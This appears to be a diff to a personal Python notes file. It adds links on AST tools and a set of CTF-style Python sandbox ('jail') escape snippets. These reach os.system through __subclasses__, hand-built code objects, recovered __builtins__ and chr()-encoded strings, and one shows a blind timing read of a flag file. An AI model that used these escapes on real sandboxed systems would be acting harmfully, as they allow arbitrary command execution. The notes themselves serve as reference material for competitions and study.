@@ -356,7 +356,7 @@ ctionType) and not isinstance(v, type)})
 python -mtimeit -s 'xs=range(10)' 'map(hex, xs)'
 ```
 
-# Disassembly, decompilation
+# Disassembly, Decompilation
 
 - [GitHub \- zrax/pycdc: C\+\+ python bytecode disassembler and decompiler](https://github.com/zrax/pycdc)
 - [GitHub \- rocky/python\-decompile3: Python decompiler for 3\.7\-3\.8 Stripped down from uncompyle6 so we can refactor and start to fix up some long\-standing problems](https://github.com/rocky/python-decompile3)
@@ -449,6 +449,13 @@ foo.func_code.co_consts
 - http://www.mingzhehu.cn/static/posts/20200211-PythonBytecodeDisassembler.html
     - https://docs.python.org/3/library/importlib.html#importlib.util.MAGIC_NUMBER
     - [PEP 552 \-\- Deterministic pycs \| Python\.org](https://www.python.org/dev/peps/pep-0552)
+
+# AST Transformation
+
+- [ast — Abstract Syntax Trees &\#8212; Python 3\.9\.13 documentation](https://docs.python.org/3.9/library/ast.html#ast.unparse)
+- [GitHub \- simonpercivall/astunparse: An AST unparser for Python](https://github.com/simonpercivall/astunparse)
+    - [cpython: 4243df51fe43 Tools/parser/unparse\.py](https://hg.python.org/cpython/file/tip/Tools/parser/unparse.py)
+- [GitHub \- berkerpeksag/astor: Python AST read/write](https://github.com/berkerpeksag/astor)
 
 # Memory Allocation / Storage
 
@@ -623,6 +630,7 @@ print(df.to_markdown())
 # deserialization
 
 - https://zeta-two.com/software/2022/01/07/simpler-unpickle-payloads-with-walrus.html
+- https://book.hacktricks.xyz/pentesting-web/deserialization#python
 
 # jail
 
@@ -631,12 +639,37 @@ print(df.to_markdown())
 - `globals() / locals() / vars()`: finding useful variables, using built-ins
     - [CTFtime\.org / Really Awesome CTF 2020 / Puffer Overflow](https://ctftime.org/task/11928)
 - `getattr() / setattr()`: call object.banned(), e.g. `getattr(object, "ban"+"ned")`
+- `func_code`: using function object
+    - [Escaping the PyJail](https://lbarman.ch/blog/pyjail/)
+    ```python
+    exit(exit.func_code.co_consts[1])
+    ```
 - `"A""B" == "AB"`: alternative for `+`
 - blind
     ```python
     cmd = '''
     python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
     '''.format(SLEEP_TIME, index, letter)
+    ```
+- assembling functions
+    - [delroth&\#039;s blog &raquo; Escaping a Python sandbox \(NdH 2013 quals writeup\)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
+    - [CTFtime\.org / TJCTF 2018 / The Abyss / Writeup](https://ctftime.org/writeup/10822)
+    ```python
+    # get_classes():
+    #   return {}.__class__.__base__.__subclasses__()
+    ftype = type(lambda: None)
+    ctype = type((lambda: None).func_code)
+    get_classes = ftype(ctype(0, 1, 2, 67, 'i\x00\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S', (None,),("_"+"_class_"+"_","_"+"_base_"+"_","_"+"_subclasses_"+"_"), (), 'stdin', 'f', 1, ''), {})
+    warnings = get_classes()[59]()
+    getModule = ftype(ctype(1, 1, 1, 67, '|\x00\x00j\x00\x00S', (None,),("_"+"module",), ("warnings",), 'stdin', 'f', 1, ''), {})
+    module = getModule(warnings)
+    os = module.sys.modules["os"]
+    os.system("cat flag.txt")
+    ```
+- recovering `__builtins__`
+    - [Eval really is dangerous \| Ned Batchelder](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
+    ```python
+    [ c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings' ][0]()._module.__builtins__
     ```
 - altenative for `__builtins__` or `import`
     ```python
@@ -672,6 +705,10 @@ print(df.to_markdown())
     [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls")
     [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins').exec('print(123)',{'__builtins__':[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins')})
     ```
+- alternative for quotes
+    ```python
+    os.system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))
+    ```
 - alternative for chars
     ```python
     print(str(print.__class__))
@@ -680,13 +717,23 @@ print(df.to_markdown())
     eval.__doc__
     # 'Evaluate the given source in the context of globals and locals.\n\nThe source may be a string representing a Python expression\nor a code object as returned by compile().\nThe globals must be a dictionary and locals can be any mapping,\ndefaulting to the current globals and locals.\nIf only globals is given, locals defaults to it.'
     ```
+- avoiding...
+    - https://blog.vero.site/post/ti1337se
+    ```python
+    # no co_names
+    compile('lambda x, y: x + y', '<math>', 'eval')
+    # no CALL_FUNCTION
+    x = lambda: (); x.f = x; x.f()
+    ```
 
-- https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes
+- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
 - https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/
 - [Breaking Out of a Python Sandbox · Issue \#6 · se162xg/notes · GitHub](https://github.com/se162xg/notes/issues/6)
 - [GitHub \- OpenToAllCTF/Tips: Useful tips by OTA CTF members \- Python jails](https://github.com/OpenToAllCTF/Tips#python-jails)
 - https://gynvael.coldwind.pl/n/python_sandbox_escape
 - https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/
+- https://org.anize.rs/GCTF-2022/sandbox/treebox
+- https://pythonmana.com/2022/04/202204150127547799.html
 
 ### type coercion
 
